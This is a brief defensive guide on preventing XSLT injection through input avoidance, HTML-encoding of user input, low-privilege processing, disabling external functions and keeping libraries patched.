XSLT injection vulnerabilities occur when user input is improperly inserted into XSL data before processing. To prevent XSLT injection, proper validation, sanitization, and additional hardening measures are essential.

### Prevention Techniques

**`1. Avoid User Input in XSL Data`**

- Ensure that user input is not directly inserted into XSL documents before being processed by the XSLT processor.

**`2. Input Validation and Sanitization`**

- If user input must be included in the XSLT document (e.g., for dynamic outputs), proper sanitization and input validation are required.
- Example: **HTML-encoding** user input when generating HTML responses.
    - HTML-encoding converts:
        - `<` to `&lt;`
        - `>` to `&gt;`
    - This prevents attackers from injecting additional XSLT elements into the document.

**`3. Additional Hardening Measures`**

- Run the XSLT processor as a **low-privilege process** to minimize the impact of exploitation.
- Disable support for **external functions**, such as PHP functions, within the XSLT processor.
- Keep the XSLT library and related components **up-to-date** to patch known vulnerabilities.

By implementing these measures, developers can significantly reduce the risk of XSLT injection vulnerabilities and limit their impact.